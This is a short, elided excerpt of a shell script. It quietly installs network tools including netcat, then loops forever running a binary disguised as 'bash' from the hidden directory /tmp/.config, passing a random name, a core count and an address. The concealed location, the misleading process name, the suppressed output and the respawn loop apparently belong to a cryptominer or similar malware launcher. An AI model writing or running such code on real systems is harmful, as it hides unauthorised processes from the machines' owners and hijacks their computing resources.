...
sudo apt -qqy install wget nload procps icu-devtools netcat >/dev/null 2>&1 || apt -qqy install wget nload procps icu-devtools netcat >/dev/null 2>&1
...
if [ "$mode" == "0" ]; then
  ...
  while true; do cd /tmp/.config; name=`RandString 2 d${cores}_${addr}`; echo ${name}; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
fi
echo "##8"
